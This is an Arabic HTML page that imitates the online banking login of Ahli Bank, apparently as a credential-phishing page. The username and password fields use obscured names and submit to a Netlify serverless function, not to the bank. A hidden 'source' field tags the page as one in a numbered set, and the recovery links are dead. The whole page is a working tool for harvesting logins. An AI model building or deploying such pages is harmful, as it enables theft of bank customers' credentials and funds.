<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك الأهلي - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            height: 100vh;
            direction: rtl;
            display: flex;
            flex-direction: column;
        }
        
        .login-main {
            background-color: #00538b;
            border-radius: 0 0 30px 30px;
            color: white;
            padding: 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            padding-top: 10px;
        }
        
        .menu-controls {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .menu-button {
            color: white;
            cursor: pointer;
            font-size: 24px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        
        .menu-button div {
            width: 6px;
            height: 6px;
            background-color: white;
            border-radius: 50%;
        }
        
        .phone-icon {
            width: 30px;
            height: 30px;
        }
        
        .lang-selector {
            background-color: #f7c52b;
            color: #00538b;
            border-radius: 25px;
            padding: 8px 20px;
            font-weight: bold;
            font-size: 16px;
        }
        
        .disabled-icon {
            width: 30px;
            height: 30px;
            color: white;
            background-color: transparent;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .welcome-text {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: normal;
        }
        
        .subtitle {
            text-align: center;
            font-size: 22px;
            margin-bottom: 30px;
            color: rgba(255, 255, 255, 0.9);
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin: 0 auto;
            width: 100%;
            max-width: 450px;
        }
        
        .form-group {
            margin-bottom: 10px;
        }
        
        .form-control {
            width: 100%;
            background-color: rgba(0, 65, 110, 0.6);
            border: none;
            border-radius: 8px;
            padding: 16px;
            font-size: 18px;
            color: white;
        }
        
        .form-control::placeholder {
            color: white;
            opacity: 1;
        }
        
        .forgot-link {
            text-align: right;
            margin: 5px 0 15px;
        }
        
        .forgot-link a {
            color: white;
            text-decoration: none;
            font-size: 16px;
            opacity: 0.8;
        }
        
        .btn-login {
            width: 100%;
            background-color: rgba(0, 65, 110, 0.6);
            color: white;
            border: none;
            border-radius: 50px;
            padding: 18px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .bottom-arrow {
            text-align: center;
            margin-top: auto;
            font-size: 20px;
            padding: 20px;
        }
        
        .arrow-down {
            width: 30px;
            height: 30px;
            border: solid white;
            border-width: 0 3px 3px 0;
            display: inline-block;
            padding: 3px;
            transform: rotate(45deg);
        }
    </style>
</head>
<body>
    <div class="login-main">
        <div class="header">
            <div class="menu-controls">
                <div class="menu-button">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
                <div class="phone-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" width="30px" height="30px">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
                    </svg>
                </div>
            </div>
            
            <div class="lang-selector">Eng</div>
            
            <div class="disabled-icon">⊘</div>
        </div>
        
        <h1 class="welcome-text">مرحباً بك في البنك الأهلي</h1>
        <div class="subtitle">تسجيل الدخول</div>
        
        <form action="/.netlify/functions/submit-login" method="post" class="login-form" id="loginForm">
            <div class="form-group">
                <input type="hidden" name="source" value="Ahli Bank (8.html)">
                <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم">
                <div class="forgot-link">
                    <a href="#">نسيت اسم المستخدم؟</a>
                </div>
            </div>
            
            <div class="form-group">
                <input name="s2" type="password" class="form-control" placeholder="كلمة المرور">
                <div class="forgot-link">
                    <a href="#">نسيت كلمة السر؟</a>
                </div>
            </div>
            
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
        
        <div class="bottom-arrow">
            <i class="arrow-down"></i>
        </div>
    </div>

    
</body>
</html>
